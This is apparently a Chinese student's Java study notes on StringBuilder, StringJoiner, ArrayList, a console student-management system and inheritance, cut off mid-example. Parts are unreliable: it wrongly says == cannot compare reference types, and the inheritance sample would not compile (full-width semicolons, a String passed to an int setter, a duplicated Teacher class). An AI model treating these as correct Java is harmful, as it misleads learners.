<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="comment">//1.定义数组</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.调用方法把数组变成字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> arrToString(arr);</span><br><span class="line"></span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// arrToString</span></span><br><span class="line">		<span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;[&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == arr.length - <span class="number">1</span>)&#123;</span><br><span class="line">                sb.append(arr[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                sb.append(arr[i]).append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br></pre></td></tr></table></figure>
<h3 id="StringJoiner"><a class="header-anchor" href="#StringJoiner">¶</a>StringJoiner</h3>
<ul>
<li>StringJoiner跟StringBuilder一样，也可以看成是一个容器，创建之后里面的内容是可变的。</li>
<li>作用：提高字符串的操作效率，而且代码编写特别简洁，但是目前市场上很少有人用。</li>
<li>JDK8出现的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.创建一个对象，并指定中间的间隔符号</span></span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.添加元素</span></span><br><span class="line">sj.add(<span class="string">&quot;aaa&quot;</span>).add(<span class="string">&quot;bbb&quot;</span>).add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.打印结果</span></span><br><span class="line">System.out.println(sj);<span class="comment">//aaa---bbb---ccc</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.创建对象</span></span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;, &quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.添加元素</span></span><br><span class="line">sj.add(<span class="string">&quot;aaa&quot;</span>).add(<span class="string">&quot;bbb&quot;</span>).add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sj.length();</span><br><span class="line">System.out.println(len);<span class="comment">//15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.打印</span></span><br><span class="line">System.out.println(sj);<span class="comment">//[aaa, bbb, ccc]</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sj.toString();</span><br><span class="line">System.out.println(str);<span class="comment">//[aaa, bbb, ccc]</span></span><br></pre></td></tr></table></figure>
<h3 id="关于字符串的小扩展"><a class="header-anchor" href="#关于字符串的小扩展">¶</a>关于字符串的小扩展</h3>
<h4 id="字符串存储的内存原理"><a class="header-anchor" href="#字符串存储的内存原理">¶</a>字符串存储的内存原理</h4>
<ul>
<li>String s = “abc”；直接赋值
<ul>
<li>特点：
<ul>
<li>此时字符串abc是存在字符串常量池中的。</li>
<li>先检查字符串常量池中有没有字符串abc，如果有，不会创建新的，而是直接复用。如果没有abc，才会创建一个新的。</li>
<li>所以，直接赋值的方式，代码简单，而且节约内存。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="new出来的字符串"><a class="header-anchor" href="#new出来的字符串">¶</a>new出来的字符串</h4>
<ul>
<li>
<p>看到<strong>new</strong>关键字，一定是在<strong>堆里面开辟了一个小空间</strong>。</p>
</li>
<li>
<p>String s1 = new String（“abc”）；</p>
</li>
<li>
<p>String s2 = “abc”；</p>
</li>
<li>
<p>s1记录的是new出来的，在<strong>堆里面的地址值</strong>。</p>
</li>
<li>
<p>s2是直接赋值的，所以记录的是<strong>字符串常量池中的地址值</strong>。</p>
</li>
</ul>
<h4 id="号比较的是什么"><a class="header-anchor" href="#号比较的是什么">¶</a>==号比较的是什么</h4>
<ul>
<li>
<p>如果比较的是基本数据类型：比的是具体的数值是否相等。</p>
</li>
<li>
<p>如果比较的是引用数据类型：比 的是地址值是否相等。</p>
</li>
<li>
<p><strong>结论：</strong>==只能用于比较基本数据类型。不能比较引用数据类型。</p>
</li>
</ul>
<h2 id="Day11-集合-学生管理系统"><a class="header-anchor" href="#Day11-集合-学生管理系统">¶</a>Day11 集合&amp;学生管理系统</h2>
<h3 id="ArrayList"><a class="header-anchor" href="#ArrayList">¶</a>ArrayList</h3>
<ul>
<li><strong>集合和数组的优势对比：</strong></li>
</ul>
<ol>
<li>长度可变</li>
<li>添加数据的时候不需要考虑索引，默认将数据添加到末尾</li>
</ol>
<h4 id="构造"><a class="header-anchor" href="#构造">¶</a>构造</h4>
<p>public ArrayList()</p>
<h4 id="成员方法"><a class="header-anchor" href="#成员方法">¶</a>成员方法</h4>
<ul>
<li>
<p>public boolean add(要添加的元素)将指定的元素追加到此集合的末尾</p>
</li>
<li>
<p>public boolean remove(要删除的元素)删除指定元素,返回值表示是否删除成功</p>
</li>
<li>
<p>public E remove(int index)删除指定索引处的元素，返回被删除的元素</p>
</li>
<li>
<p>public E set(int index,E element)修改指定索引处的元素，返回被修改的元素</p>
</li>
<li>
<p>public E get(int index)返回指定索引处的元素</p>
</li>
<li>
<p>public int size()返回集合中的元素的个数</p>
</li>
</ul>
<h4 id="遍历"><a class="header-anchor" href="#遍历">¶</a>遍历</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="comment">//i 依次表示集合里面的每一个索引</span></span><br><span class="line">            <span class="keyword">if</span>(i == list.size() - <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//最大索引</span></span><br><span class="line">                System.out.print(list.get(i));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//非最大索引</span></span><br><span class="line">                System.out.print(list.get(i) + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：查找用户索引"><a class="header-anchor" href="#案例：查找用户索引">¶</a>案例：查找用户索引</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//1.创建集合对象</span></span><br><span class="line">      ArrayList&lt;User&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//2.创建用户对象</span></span><br><span class="line">      <span class="type">User</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;heima001&quot;</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">      <span class="type">User</span> <span class="variable">u2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;heima002&quot;</span>, <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;1234&quot;</span>);</span><br><span class="line">      <span class="type">User</span> <span class="variable">u3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;heima003&quot;</span>, <span class="string">&quot;wangwu&quot;</span>, <span class="string">&quot;1234qwer&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//3.把用户对象添加到集合当中</span></span><br><span class="line">      list.add(u1);</span><br><span class="line">      list.add(u2);</span><br><span class="line">      list.add(u3);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//4.调用方法，通过id获取对应的索引</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(list, <span class="string">&quot;heima001&quot;</span>);</span><br><span class="line"></span><br><span class="line">      System.out.println(index);</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.我要干嘛？  根据id查找对应的学生信息</span></span><br><span class="line">  <span class="comment">//2.我干这件事情需要什么才能完成？   集合 id</span></span><br><span class="line">  <span class="comment">//3.方法的调用处是否需要继续使用方法的结果？</span></span><br><span class="line">  <span class="comment">//要用必须返回，不要用可以返回也可以不返回</span></span><br><span class="line">  <span class="comment">//明确说明需要有返回值 int</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(ArrayList&lt;User&gt; list, String id)</span> &#123;</span><br><span class="line">      <span class="comment">//遍历集合得到每一个元素</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">          <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">          <span class="type">String</span> <span class="variable">uid</span> <span class="operator">=</span> u.getId();</span><br><span class="line">          <span class="keyword">if</span>(uid.equals(id))&#123;</span><br><span class="line">              <span class="keyword">return</span> i;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//因为只有当集合里面所有的元素都比较完了，才能断定id是不存在的。</span></span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="学生管理系统"><a class="header-anchor" href="#学生管理系统">¶</a>学生管理系统</h3>
<ul>
<li>
<p>案例需求</p>
</li>
<li>
<p>综合案例：学生管理系统。该系统主要功能如下：</p>
<ul>
<li>添加学生：通过键盘录入学生信息，添加到集合中</li>
<li>删除学生：通过键盘录入要删除学生的学号，将该学生对象从集合中删除</li>
<li>修改学生：通过键盘录入要修改学生的学号，将该学生对象其他信息进行修改</li>
<li>查看学生：将集合中的学生对象信息进行展示</li>
<li>退出系统：结束程序</li>
</ul>
</li>
<li>
<p>实现步骤</p>
<ul>
<li>
<p>定义学生类，包含以下成员变量</p>
</li>
<li>
<p>​        private String sid            // 学生id</p>
</li>
<li>
<p>​        private String name       // 学生姓名</p>
</li>
<li>
<p>​        private String age          // 学生年龄</p>
</li>
<li>
<p>​        private String address   // 学生所在地</p>
</li>
<li>
<p>学生管理系统<strong>主界面</strong>的搭建步骤</p>
</li>
<li>
<ul>
<li>用输出语句完成主界面的编写 用Scanner实现键盘输入 用switch语句完成选择的功能 用循环完成功能结束后再次回到主界面</li>
</ul>
</li>
<li>
<p>学生管理系统的<strong>添加学生</strong>功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法内完成添加学生的功能    ①键盘录入学生信息    ②根据录入的信息创建学生对象    ③将学生对象添加到集合中    ④提示添加成功信息 在添加学生的选项里调用添加学生的方法</Student></li>
</ul>
</li>
<li>
<p>学生管理系统的<strong>查看学生</strong>功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法内遍历集合，将学生信息进行输出 在查看所有学生选项里调用查看学生方法</Student></li>
</ul>
</li>
<li>
<p>学生管理系统的删除学生功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法中接收要删除学生的学号 遍历集合，获取每个学生对象 使用学生对象的学号和录入的要删除的学号进行比较,如果相同，则将当前学生对象从集合中删除 在删除学生选项里调用删除学生的方法</Student></li>
</ul>
</li>
<li>
<p>学生管理系统的修改学生功能实现步骤</p>
</li>
<li>
<ul>
<li>定义一个方法，接收ArrayList<Student>集合 方法中接收要修改学生的学号 通过键盘录入学生对象所需的信息，并创建对象 遍历集合，获取每一个学生对象。并和录入的修改学生学号进行比较.如果相同，则使用新学生对象替换当前学生对象 在修改学生选项里调用修改学生的方法</Student></li>
</ul>
</li>
<li>
<p>退出系统</p>
</li>
<li>
<ul>
<li>使用System.exit(0);退出JVM</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选几处值得看的代码摘录</span></span><br><span class="line">	<span class="comment">// 菜单选择部分</span></span><br><span class="line">		<span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;1&quot;</span> -&gt; addStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> -&gt; deleteStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;3&quot;</span> -&gt; updateStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;4&quot;</span> -&gt; queryStudent(list);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;5&quot;</span> -&gt; &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">                    <span class="comment">//break loop;</span></span><br><span class="line">                    System.exit(<span class="number">0</span>);<span class="comment">//停止虚拟机运行</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;没有这个选项&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 添加学生部分</span></span><br><span class="line">		<span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> contains(list, id);</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                <span class="comment">//表示id已经存在，需要重新录入</span></span><br><span class="line">                System.out.println(<span class="string">&quot;id已经存在，请重新录入&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//表示id不存在，表示可以使用</span></span><br><span class="line">                s.setId(id);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 删除学生部分</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(list, id);</span><br><span class="line">        <span class="comment">//对index进行判断</span></span><br><span class="line">        <span class="comment">//如果-1，就表示不存在，结束方法，回到初始菜单</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//如果大于等于0的，表示存在，直接删除</span></span><br><span class="line">            list.remove(index);</span><br><span class="line">            System.out.println(<span class="string">&quot;id为：&quot;</span> + id + <span class="string">&quot;的学生删除成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;id不存在，删除失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改学生信息部分</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> sc.next();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(list, id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index == -<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;要修改的id&quot;</span> + id + <span class="string">&quot;不存在，请重新输入&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当代码执行到这里，表示什么？表示当前id是存在的。</span></span><br><span class="line">        <span class="comment">//获取要修改的学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> list.get(index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输入其他的信息并修改</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要修改的学生姓名&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newName</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        stu.setName(newName);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要修改的学生年龄&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">newAge</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        stu.setAge(newAge);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要修改的学生家庭住址&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newAddress</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        stu.setAddress(newAddress);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;学生信息修改成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断id在集合中是否存在</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(ArrayList&lt;Student&gt; list, String id)</span> &#123;</span><br><span class="line">        <span class="comment">//循环遍历集合得到里面的每一个学生对象</span></span><br><span class="line">        <span class="comment">/*for (int i = 0; i &lt; list.size(); i++) &#123;</span></span><br><span class="line"><span class="comment">            //拿到学生对象后，获取id并进行判断</span></span><br><span class="line"><span class="comment">            Student stu = list.get(i);</span></span><br><span class="line"><span class="comment">            String sid = stu.getId();</span></span><br><span class="line"><span class="comment">            if(sid.equals(id))&#123;</span></span><br><span class="line"><span class="comment">                //存在，true</span></span><br><span class="line"><span class="comment">                return true;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        // 不存在false</span></span><br><span class="line"><span class="comment">        return false;*/</span></span><br><span class="line">       <span class="keyword">return</span> getIndex(list,id) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过id获取索引的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(ArrayList&lt;Student&gt; list, String id)</span>&#123;</span><br><span class="line">        <span class="comment">//遍历集合</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="comment">//得到每一个学生对象</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">            <span class="comment">//得到每一个学生对象的id</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sid</span> <span class="operator">=</span> stu.getId();</span><br><span class="line">            <span class="comment">//拿着集合中的学生id跟要查询的id进行比较</span></span><br><span class="line">            <span class="keyword">if</span>(sid.equals(id))&#123;</span><br><span class="line">                <span class="comment">//如果一样，那么就返回索引</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当循环结束之后还没有找到，就表示不存在，返回-1.</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day12-学生管理系统升级版"><a class="header-anchor" href="#Day12-学生管理系统升级版">¶</a>Day12 学生管理系统升级版</h2>
<h3 id="需求文档←"><a class="header-anchor" href="#需求文档←">¶</a>需求文档←</h3>
<ul>
<li>需求
<ul>
<li>为学生管理系统书写一个登陆、注册、忘记密码的功能。</li>
<li>只有用户登录成功之后，才能进入到学生管理系统中进行增删改查操作。</li>
</ul>
</li>
</ul>
<h4 id="登录界面："><a class="header-anchor" href="#登录界面：">¶</a><strong>登录界面：</strong></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;欢迎来到学生管理系统&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;请选择操作1登录 2注册 3忘记密码&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="用户类："><a class="header-anchor" href="#用户类：">¶</a><strong>用户类：</strong></h4>
<p>属性：用户名、密码、身份证号码、手机号码</p>
<h4 id="注册功能："><a class="header-anchor" href="#注册功能：">¶</a><strong>注册功能：</strong></h4>
<ol>
<li><strong>用户名</strong>需要满足以下要求：</li>
</ol>
<ul>
<li>验证要求：
<ul>
<li>用户名唯一</li>
<li>用户名长度必须在3~15位之间</li>
<li>只能是字母加数字的组合，但是不能是纯数字</li>
</ul>
</li>
</ul>
<ol start="2">
<li>
<p>密码键盘输入两次，两次一致才可以进行注册。</p>
</li>
<li>
<p>身份证号码需要验证。</p>
</li>
</ol>
<p>验证要求：</p>
<p>长度为18位</p>
<p>不能以0为开头</p>
<p>前17位，必须都是数字</p>
<p>最后一位可以是数字，也可以是大写X或小写x</p>
<ol start="4">
<li>手机号验证。</li>
</ol>
<p>验证要求：</p>
<p>长度为11位</p>
<p>不能以0为开头</p>
<p>必须都是数字</p>
<h4 id="登录功能："><a class="header-anchor" href="#登录功能：">¶</a><strong>登录功能：</strong></h4>
<ol>
<li>键盘录入用户名</li>
<li>键盘录入密码</li>
<li>键盘录入验证码</li>
</ol>
<p>验证要求：</p>
<p>用户名如果未注册，直接结束方法，并提示：用户名未注册，请先注册</p>
<p>判断验证码是否正确，如不正确，重新输入</p>
<p>再判断用户名和密码是否正确，有3次机会</p>
<h4 id="忘记密码："><a class="header-anchor" href="#忘记密码：">¶</a><strong>忘记密码：</strong></h4>
<ol>
<li>键盘录入用户名，判断当前用户名是否存在，如不存在，直接结束方法，并提示：未注册</li>
<li>键盘录入身份证号码和手机号码</li>
<li>判断当前用户的身份证号码和手机号码是否一致，
<ol>
<li>
<p>如果一致，则提示输入密码，进行修改。</p>
</li>
<li>
<p>如果不一致，则提示：账号信息不匹配，修改失败。</p>
</li>
</ol>
</li>
</ol>
<h4 id="验证码规则："><a class="header-anchor" href="#验证码规则：">¶</a><strong>验证码规则：</strong></h4>
<ol>
<li>长度为5</li>
<li>由4位大写或者小写字母和1位数字组成，同一个字母可重复</li>
<li>数字可以出现在任意位置</li>
</ol>
<p>比如：aQa1K</p>
<h2 id="Day13-面向对象进阶（static-继承）"><a class="header-anchor" href="#Day13-面向对象进阶（static-继承）">¶</a>Day13 面向对象进阶（static&amp;继承）</h2>
<h3 id="学习目标"><a class="header-anchor" href="#学习目标">¶</a><strong>学习目标</strong></h3>
<ul>
<li>能够掌握static关键字修饰的变量调用方式</li>
<li>能够掌握static关键字修饰的方法调用方式</li>
<li>知道静态代码块的格式和应用场景</li>
<li>能够写出类的继承格式</li>
<li>能够说出继承的特点</li>
<li>能够区分this和super的作用</li>
<li>能够说出方法重写的概念</li>
<li>能够说出方法重写的注意事项</li>
</ul>
<h3 id="封装-v2"><a class="header-anchor" href="#封装-v2">¶</a>封装</h3>
<ol>
<li>使用 <code>private</code> 关键字来修饰成员变量。</li>
<li>使用<code>public</code>修饰getter和setter方法</li>
</ol>
<h3 id="static"><a class="header-anchor" href="#static">¶</a>static</h3>
<ul>
<li>有static修饰成员变量，说明这个成员变量是属于类的，这个成员变量称为<strong>类变量</strong>或者<strong>静态成员变量</strong>。 直接用  类名访问即可。因为类只有一个，所以静态成员变量在内存区域中也只存在一份。所有的对象都可以共享这个变量</li>
<li>与静态成员变量一样，静态方法也是直接通过<strong>类名.方法名称</strong>即可访问</li>
</ul>
<h3 id="继承"><a class="header-anchor" href="#继承">¶</a>继承</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 父类 &#123;...&#125;</span><br><span class="line"></span><br><span class="line">class 子类 extends 父类 &#123;...&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：<strong>Java是单继承的，一个类只能继承一个直接父类</strong>，跟现实世界很像，但是Java中的子类是更加强大的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 有点忘了细节所以记一下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类Human类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">    <span class="comment">// 合理隐藏</span></span><br><span class="line">    <span class="keyword">private</span> String name ;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age ;</span><br><span class="line">    <span class="comment">// 合理暴露</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Teacher类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">    <span class="comment">// 工资</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary ;</span><br><span class="line">    <span class="comment">// 特有方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">teach</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老师在认真教技术！&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSalary</span><span class="params">(<span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Student</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Human</span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类BanZhuren类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">    <span class="comment">// 工资</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary ;</span><br><span class="line">       <span class="comment">// 特有方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">admin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;班主任强调纪律问题！&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSalary</span><span class="params">(<span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          <span class="type">Teacher</span> <span class="variable">dlei</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">          dlei.setName(<span class="string">&quot;播仔&quot;</span>);</span><br><span class="line">          dlei.setAge(<span class="string">&quot;31&quot;</span>);</span><br><span class="line">          dlei.setSalary(<span class="number">1000.99</span>);</span><br><span class="line">          System.out.println(dlei.getName());</span><br><span class="line">          System.out.println(dlei.getAge());</span><br><span class="line">          System.out.println(dlei.getSalary());</span><br><span class="line">          dlei.teach();</span><br><span class="line">          <span class="type">BanZhuRen</span> <span class="variable">linTao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BanZhuRen</span>();</span><br><span class="line">          linTao.setName(<span class="string">&quot;灵涛&quot;</span>);</span><br><span class="line">          